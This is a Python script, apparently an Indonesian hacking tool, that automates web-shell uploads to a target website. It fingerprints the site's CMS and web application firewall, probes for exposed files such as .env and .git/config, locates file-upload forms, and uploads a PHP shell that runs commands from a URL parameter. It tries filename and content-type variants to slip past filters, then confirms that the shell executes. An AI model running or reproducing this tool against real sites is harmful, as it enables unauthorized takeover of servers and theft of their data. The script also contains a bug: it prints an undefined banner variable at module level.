import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin, urlparse
import random
import time

class AdaptiveShellUploader:
    def __init__(self, target_url):
        self.target_url = target_url if target_url.endswith('/') else target_url + '/'
        self.session = requests.Session()
        self.cms = None
        self.waf_detected = False
        self.upload_form = None
        self.headers = {}
        self.possible_shell_paths = []
        self.proxies = self.load_proxies()
        self.proxy = random.choice(self.proxies) if self.proxies else None
        self.shell_payload = {
            'php': '<?php echo "SHELL_OK"; system($_GET["cmd"]); ?>',
            'filename_variants': ['shell.php', 'shell.pHp', 'shell.php5'],
            'content_types': ['application/x-php', 'image/jpeg']
        }
        self.waf_indicators = [
            'X-WAF-Detected', 'CF-RAY', 'X-Sucuri-ID', 'X-Akamai-Transformed', 'X-Distil-CS',
            'X-Mod-Security', 'X-Powered-By-AspNet', 'X-CDN', 'X-Cache', 'X-Proxy-Cache'
        ]

    def load_proxies(self):
        try:
            with open("proxies.txt", "r") as f:
                return [line.strip() for line in f.readlines() if line.strip()]
        except:
            return []

    def get_random_headers(self):
        try:
            resp = self.session.get(self.target_url, timeout=5)
            user_agent = resp.request.headers.get('User-Agent', 'Mozilla/5.0')
            referer = resp.url
            x_forwarded = resp.headers.get('X-Forwarded-For', '127.0.0.1')
            return {
                'User-Agent': user_agent,
                'Referer': referer,
                'X-Forwarded-For': x_forwarded
            }
        except:
            return {
                'User-Agent': 'Mozilla/5.0',
                'Referer': self.target_url,
                'X-Forwarded-For': '127.0.0.1'
            }

    def recon(self):
        print('[*] Melakukan recon ke target:', self.target_url)
        try:
            start_time = time.time()
            resp = self.session.get(self.target_url, timeout=10, proxies={"http": self.proxy, "https": self.proxy} if self.proxy else None)
            response_time = time.time() - start_time

            self.headers = resp.headers
            status = resp.status_code
            content_len = len(resp.text)
            final_url = resp.url

            print(f'[+] Header: {self.headers}')
            print(f'[+] Status Code: {status}')
            print(f'[+] Response Time: {response_time:.2f}s')
            print(f'[+] Content Length: {content_len}')
            print(f'[+] Final Redirect URL: {final_url}')

            for indicator in self.waf_indicators:
                if indicator in resp.headers:
                    print(f'[!] WAF terdeteksi melalui header: {indicator}')
                    self.waf_detected = True

            if status in [403, 406, 501, 502]:
                print(f'[!] Status code {status} menunjukkan kemungkinan WAF/CDN aktif')
                self.waf_detected = True

            soup = BeautifulSoup(resp.text, 'html.parser')

            # CMS Detection
            generator_meta = soup.find('meta', attrs={'name': 'generator'})
            if generator_meta and 'content' in generator_meta.attrs:
                generator = generator_meta['content'].lower()
                if 'wordpress' in generator:
                    self.cms = 'WordPress'
                elif 'joomla' in generator:
                    self.cms = 'Joomla'
                elif 'drupal' in generator:
                    self.cms = 'Drupal'
                elif 'magento' in generator:
                    self.cms = 'Magento'
                elif 'prestashop' in generator:
                    self.cms = 'Prestashop'
                elif 'blogger' in generator:
                    self.cms = 'Blogger'

            content = resp.text.lower()
            if not self.cms:
                if 'wp-content' in content:
                    self.cms = 'WordPress'
                elif '/sites/all' in content:
                    self.cms = 'Drupal'
                elif '/skin/frontend' in content:
                    self.cms = 'Magento'
                elif '/modules/' in content and 'prestashop' in content:
                    self.cms = 'Prestashop'

            print('[+] CMS terdeteksi:', self.cms)

            # Upload Form
            forms = soup.find_all('form')
            for form in forms:
                if form.find('input', {'type': 'file'}):
                    self.upload_form = form
                    print('[+] Form upload ditemukan.')
                    break

            if not self.upload_form:
                iframe_tags = soup.find_all('iframe')
                for iframe in iframe_tags:
                    src = iframe.get('src')
                    if src:
                        iframe_url = urljoin(self.target_url, src)
                        try:
                            iframe_resp = self.session.get(iframe_url, timeout=10)
                            if re.search(r'<form.*?input[^>]+type=[\'"]?file[\'"]?', iframe_resp.text, re.I):
                                self.upload_form = BeautifulSoup(iframe_resp.text, 'html.parser').find('form')
                                print('[+] Form upload ditemukan dalam iframe:', iframe_url)
                                break
                        except:
                            continue

            # Fallback Regex
            if not self.upload_form and re.search(r'<form[^>]+>.*?type=[\'"]?file[\'"]?', resp.text, re.I | re.S):
                self.upload_form = soup.find('form', string=re.compile(r'type=["\']?file["\']?', re.I))
                print('[+] Form upload ditemukan dengan regex scanning.')

            self.deep_osint()

        except Exception as e:
            print('[!] Gagal melakukan recon:', str(e))

    def deep_osint(self):
        print('[*] Melakukan OSINT tambahan...')
        paths = ['robots.txt', 'sitemap.xml', '.env', '.git/config', '.DS_Store']
        for path in paths:
            url = urljoin(self.target_url, path)
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200 and len(resp.text.strip()) > 10:
                    print(f'[+] Ditemukan {path}: {url}')
            except:
                continue

    def decision_engine(self):
        if self.cms == 'WordPress' and self.upload_form:
            print('[*] Deteksi WordPress dengan form upload, lanjut ke WP shell upload...')
            return 'wp_upload'
        elif self.cms == 'Laravel':
            print('[*] Laravel terdeteksi, coba ke folder publik...')
            return 'laravel_upload'
        elif self.waf_detected:
            print('[*] WAF aktif, coba dengan nama file dan content-type obfuscation...')
            return 'bypass_upload'
        elif self.upload_form:
            print('[*] Form upload umum ditemukan, coba brute upload standar...')
            return 'generic_upload'
        else:
            print('[!] Tidak ada jalur upload yang jelas, hentikan eksekusi.')
            return None

    def generate_shell_file(self, filename, content_type):
        from io import BytesIO
        shell = BytesIO(self.shell_payload['php'].encode())
        shell.name = filename
        return (filename, shell, content_type)

    def try_upload(self):
        action_type = self.decision_engine()
        if not action_type:
            return

        if action_type == 'laravel_upload':
            paths = ['storage/', 'uploads/', 'public/', 'files/']
            for folder in paths:
                for fname in self.shell_payload['filename_variants']:
                    url = urljoin(self.target_url, folder + fname)
                    print('[*] Coba akses langsung:', url)
                    try:
                        r = self.session.get(url)
                        if 'SHELL_OK' in r.text:
                            print('[+] SHELL TERBACA DI:', url)
                            return
                    except:
                        pass

        elif action_type in ['wp_upload', 'generic_upload', 'bypass_upload']:
            try:
                upload_url = self.upload_form.get('action')
                method = self.upload_form.get('method', 'post').lower()
                full_upload_url = urljoin(self.target_url, upload_url)

                headers = self.get_random_headers()

                for fname in self.shell_payload['filename_variants']:
                    for ctype in self.shell_payload['content_types']:
                        print(f'[*] Uploading {fname} dengan tipe {ctype} ke {full_upload_url}')
                        files = {
                            'file': self.generate_shell_file(fname, ctype)
                        }
                        try:
                            if method == 'post':
                                resp = self.session.post(full_upload_url, files=files, headers=headers, timeout=15)
                            else:
                                resp = self.session.get(full_upload_url, files=files, headers=headers, timeout=15)

                            possible_path = re.findall(r"(?:href|src)=[\"'](.*?%s)[\"']" % fname, resp.text)
                            if possible_path:
                                shell_url = urljoin(self.target_url, possible_path[0])
                                check = self.session.get(shell_url)
                                if 'SHELL_OK' in check.text:
                                    print('[+] SHELL TERUPLOAD:', shell_url)
                                    return
                        except Exception as e:
                            print('[!] Upload gagal:', str(e))

            except Exception as e:
                print('[!] Gagal parsing form upload:', str(e))

    def run(self):
        self.recon()
        self.try_upload()

def logo1():
  logo = """
                                      ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░        
                                    ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
                                     ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
                                      ░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓█▓▒░        
                                            ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
                                            ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
                                     ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░ 
           create By saldy my name hacked Kemi

"""
print(logo)
if __name__ == "__main__":
    logo1()
    target = input("Masukkan target URL (cth: http://example.com): ")
    uploader = AdaptiveShellUploader(target)
    uploader.run()
